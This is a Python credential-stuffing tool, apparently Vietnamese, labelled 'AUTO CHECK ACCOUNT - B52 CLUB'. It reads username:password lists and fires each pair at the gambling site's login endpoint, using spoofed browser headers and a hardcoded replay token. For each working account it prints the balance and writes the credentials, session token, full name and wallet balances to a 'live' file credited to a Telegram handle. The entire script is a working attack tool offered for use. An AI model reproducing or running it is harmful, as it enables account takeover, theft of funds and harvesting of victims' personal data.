import requests
import tkinter as tk
from tkinter import filedialog
import json
import threading
import time
from datetime import datetime
import os
import sys

# Thiết lập encoding cho console để tránh lỗi Unicode
if sys.platform == "win32":
    import codecs
    sys.stdout = codecs.getwriter("utf-8")(sys.stdout.detach())
    sys.stderr = codecs.getwriter("utf-8")(sys.stderr.detach())

class AccountChecker:
    def __init__(self):
        self.headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://v.b52.vip',
            'priority': 'u=1, i',
            'referer': 'https://v.b52.vip/',
            'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        self.url = 'https://bfivegwlog.gwtenkges.com/user/login.aspx'
        self.accounts = []
        self.live_file = 'live.txt'
        self.total_accounts = 0
        self.checked_accounts = 0
        self.live_accounts = 0
        self.dead_accounts = 0
        
    def select_file(self):
        """Chọn file chứa danh sách tài khoản"""
        try:
            root = tk.Tk()
            root.withdraw()  # Ẩn cửa sổ chính
            
            file_path = filedialog.askopenfilename(
                title="Chọn file chứa tài khoản",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            return file_path
        except Exception:
            # Fallback nếu không có giao diện (GUI)
            print("\nKhông thể mở hộp thoại chọn file. Vui lòng nhập đường dẫn file trực tiếp:")
            path = input("Đường dẫn file (.txt): ").strip()
            if os.path.exists(path):
                return path
            return None
    
    def load_accounts(self, file_path):
        """Đọc danh sách tài khoản từ file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                lines = file.readlines()
                
            for line in lines:
                line = line.strip()
                if line and ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        username, password = parts[0].strip(), parts[1].strip()
                        self.accounts.append({
                            'username': username,
                            'password': password,
                            'status': 'pending'
                        })
            
            self.total_accounts = len(self.accounts)
            print(f"Đã tải {self.total_accounts} tài khoản từ file")
            return True
            
        except Exception as e:
            print(f"Lỗi khi đọc file: {e}")
            return False
    
    def create_data_payload(self, username, password):
        """Tạo payload cho request đăng nhập"""
        base_data = {
            "username": username,
            "password": password,
            "app_id": "b52.club",
            "os": "Windows",
            "device": "Computer",
            "browser": "chrome",
            "fg": "e7fb4cff0fb11d86243d1073ab62a112",
            "version": "1.82.3",
            "r_token": "HFa2tseBJKfDFpbmZZRUFIRAoKKHoaXzRuAiAtGz4rKDcoCAt4EHgjEzBrZjFMKms2eTpHDxgfQl5cT2l9HF0nbHI6LGV7Mns3KBZMM1IZM2cgMCF_FUx7MW42V0NaRGBrZ1poFlhEdm5ES3oXbHVVY1QaD2gACUIWJzBXM1JkNSZpSzEdGhodDx17KW8YLDV8Blt3VmZ3PDdeHQ9vQA5qTmVsfXgSPXw2Hy02GEtleBpLd1duY2U7bHxyVxJAdSwwe2B7bGx4UFsgMCF_FUx7MW42V0NaRGBrZ1poFlhEdm5ES3oXbHVVY1QaD2gACUIWJzBXM1JkNSZpSzEdGhodDx17KW8YLDV8Blt3VmZ3PDdeHQ9vQA5qTmVsfXgSPXw2Hy02GEtleBpLd1duY2U7bHxyVxJAdSwwe2B7bGx4UFsgMCF_Eks",
            "aff_id": "b52",
            "d": {
                "e": "KFtFEY+jHkt19+/qVTFUPNTz2s6pRdVJgOc0zGNmqECUG/vsPt8zFLu7q4SEZsravRA21JKEFTOXJdH79uZA6996M6fPPJYIVby225E44LGFq4hXn6metBhX4+ccz5rIYdzMJtfLtZzmSGiHAw/D/V3bXjk02sCgiJOyeEdNCfmdCpzuXh5KBTRU5NOp2FoWJR9X/ZtKqm/T1CDkpuowuiyF4i0BOOK6cDsEWBe7IoBdm9SAQrGk2zREvQ/GDmHEMmbJuu4imojhX5VmiIKaeCMVLh7wuLlpWOofuyJXtZcwMLld1SVr+z3Lf7/g8ZoIpQx4iVmufl6V+JjCH1DnUIKp1/OZ+LzD+4xCtKf3r3h8B/8aWDXjCuDxY31+WiOppkmQXJ6OFGrHAkyJqdsVUlmQJ59e1+CWb8kxoxMBZHVx/k+aW9++LaY/QprrKm8+wT4K/nfnuVLkkyJ+/ndBw6jYZ6L4bHd6yEgfvUPYbK8J4PF+FC2dVXwzhFKuuicrhQatGeBeWFsGrIRGPI6uXVF9I56z9hNaZTJ7tNvU1Dw70pNbP6pxytLAIUnb5TlofQ5KBhSJsynsLGwNGGIT7KCQILsAAbU/MOvXiyoUCMQiu7WA0CgMS+6phGzftYmFSCk8evx7Jb8oWdZQ7/qr6DZ7OIJmRhS0+8sp9qCOMWpEiniDLUD6wObM",
                "t": int(time.time()),
                "k": "0216c71d5a"
            }
        }
        
        return json.dumps(base_data, separators=(',', ':'))
    
    def check_account(self, account):
        """Kiểm tra một tài khoản"""
        username = account['username']
        password = account['password']
        
        try:
            data = self.create_data_payload(username, password)
            
            response = requests.post(
                self.url, 
                headers=self.headers, 
                data=data,
                timeout=10
            )
            
            result = response.json()
            
            if response.status_code == 200 and result.get('status') == 'OK':
                # Tài khoản live
                user_data = result['data'][0]
                
                # Lưu vào file live.txt ngay lập tức
                self.save_live_account(account, user_data)
                
                # Hiển thị thông tin
                print(f"LIVE -> {username}:{password} | Balance: {user_data['main_balance']}")
                
                self.live_accounts += 1
                return 'live'
                
            else:
                # Tài khoản sai mật khẩu
                print(f"DEAD -> {username}:{password}")
                
                self.dead_accounts += 1
                return 'dead'
                
        except Exception as e:
            print(f"ERROR -> {username}:{password} | {e}")
            return 'error'
    
    def save_live_account(self, account, user_data):
        """Lưu tài khoản live vào file"""
        try:
            line = f"{account['username']}:{account['password']} | {user_data['username']} | {user_data['fullname']} | {user_data['token']} | {user_data['level']} | {user_data['main_balance']} | {user_data['wallet_101']} | {user_data['wallet_102']} | {user_data['extra_balance']} | {user_data['id']} | Auth: t.me/segv7f\n"
            
            with open(self.live_file, 'a', encoding='utf-8') as file:
                file.write(line)
                
        except Exception as e:
            print(f"Lỗi khi lưu tài khoản live: {e}")
    
    def display_stats(self):
        """Hiển thị thống kê"""
        print("\n" + "="*30)
        print(f"Total: {self.total_accounts}")
        print(f"Checked: {self.checked_accounts}")
        print(f"Live: {self.live_accounts}")
        print(f"Dead: {self.dead_accounts}")
        print("="*30 + "\n")
    
    def start_checking(self):
        """Bắt đầu kiểm tra tất cả tài khoản"""
        if not self.accounts:
            print("Không có tài khoản để kiểm tra!")
            return
        
        print(f"\nBắt đầu kiểm tra {self.total_accounts} tài khoản...")
        
        # Tạo file live.txt mới
        with open(self.live_file, 'w', encoding='utf-8') as f:
            f.write(f"--- Check result {datetime.now()} ---\n")
        
        for account in self.accounts:
            self.checked_accounts += 1
            status = self.check_account(account)
            account['status'] = status
            
            # Tạm dừng giữa các request
            time.sleep(0.5)
        
        print("\n" + "="*30)
        print("HOÀN THÀNH!")
        print("="*30)
        self.display_stats()
        print(f"Kết quả lưu tại: {os.path.abspath(self.live_file)}")

def main():
    checker = AccountChecker()
    
    print("="*50)
    print("AUTO CHECK ACCOUNT - B52 CLUB")
    print("="*50)
    
    file_path = checker.select_file()
    
    if not file_path:
        print("Không chọn file. Thoát.")
        return
    
    if checker.load_accounts(file_path):
        checker.start_checking()
    else:
        print("Không thể tải tài khoản.")

if __name__ == "__main__":
    main()